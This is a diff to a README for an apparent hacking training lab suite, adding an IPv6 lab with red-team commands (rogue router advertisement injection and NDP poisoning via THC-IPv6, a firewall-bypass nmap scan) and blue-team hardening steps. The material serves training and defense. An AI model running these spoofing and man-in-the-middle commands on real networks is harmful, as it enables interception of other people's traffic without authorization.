@@ -212,6 +212,51 @@ curl -s -H "X-API-Key: ak_auditor_31415926" http://<UBUNTU_VM_IP>:8089/api/v1/ad
 #### 5. Secure Mode Verification & Security Auditor Diagnostic Key
 In **Secure Mode**, the API strictly validates JWT signatures, enforces rate limiting, blocks query parameter API keys, disables GraphQL introspection, and whitelists webhook domains. Security auditors can verify compliance using the dedicated Auditor Key (`ak_auditor_31415926`).
 
+### J. IPv6 Network Hacking, Dual-Stack & First-Hop Defenses - IPv6 Shark (`:8090`)
+The **IPv6 Shark Lab** provides a single-page portfolio, tech blog, and interactive IPv6 security testing suite for red/blue team training on IPv6 networks:
+
+#### 1. IPv6 Connectivity & Local Domain Access
+- **IPv6 Address Transport**: `http://[::1]:8090` or `http://[fe80::1%eth0]:8090`
+- **IPv6 Domain Resolution (`ipv6.lab`)**:
+  - **Linux / macOS (`/etc/hosts`)**:
+    ```bash
+    echo "::1 ipv6.lab" | sudo tee -a /etc/hosts
+    echo "127.0.0.1 ipv6.lab" | sudo tee -a /etc/hosts
+    ```
+  - **Windows (Admin PowerShell)**:
+    ```powershell
+    Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "::1 ipv6.lab"
+    Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "127.0.0.1 ipv6.lab"
+    ```
+
+#### 2. Red Team IPv6 Penetration Testing
+```bash
+# A. IPv6 Multicast All-Nodes Reconnaissance
+ping6 -I eth0 ff02::1
+nmap -6 -sP fe80::/64%eth0
+
+# B. Rogue SLAAC Router Advertisement Injection (THC-IPv6)
+atk6-fake_router6 eth0 -A 2001:db8:cyber:1::/64 -D 2001:db8:cyber:1::53 -s fe80::bad:cafe
+
+# C. NDP Poisoning & Cache Overwrite (IPv6 MITM)
+atk6-parasite6 eth0 -t fe80::1001 -g fe80::1
+
+# D. IPv6 Extension Header Firewall Bypass
+nmap -6 --ip-frag 8 -sS -p 22,80,8090 <TARGET_IPV6>
+```
+
+#### 3. Blue Team IPv6 Defenses & Hardening
+- **Router Advertisement Guard (RA Guard - RFC 6105)**: Enable on Layer 2 switch access ports (`ipv6 nd raguard attach-policy RA_GUARD_POLICY`).
+- **Secure Neighbor Discovery (SEND - RFC 3971)**: Implement cryptographic signatures on Neighbor Solicitation and Advertisement messages.
+- **Dual-Stack ip6tables Perimeter Filtering**:
+  ```bash
+  ip6tables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+  ip6tables -A INPUT -p icmpv6 --icmpv6-type neighbor-solicitation -j ACCEPT
+  ip6tables -A INPUT -p icmpv6 --icmpv6-type neighbor-advertisement -j ACCEPT
+  ip6tables -A INPUT -p tcp --dport 8090 -j ACCEPT
+  ip6tables -P INPUT DROP
+  ```
+
 ---
 
 ## 🚀 Microservices Quickstart Summary
@@ -232,6 +277,7 @@ chmod +x start_labs.sh
 - **📡 Dadiwoo SNMP Network Lab**: `http://<YOUR_HOST_IP>:8087` (UDP `:16161`)
 - **🔑 Dadiwoo SSH Hacking Lab**: `http://<YOUR_HOST_IP>:8088` (TCP `:2222`)
 - **🏬 Dadiwoo API Warehouse Lab**: `http://<YOUR_HOST_IP>:8089`
+- **🦈 Dadiwoo IPv6 Shark Lab**: `http://<YOUR_HOST_IP>:8090` (or `http://ipv6.lab:8090` / `http://[::1]:8090`)
 # Wave Lab HTTPS / SSL Setup
 
 To test SSL/TLS vulnerabilities on the **Wave Chat Lab** from a machine such as Kali Linux, the Wave service needs to support **HTTPS**.
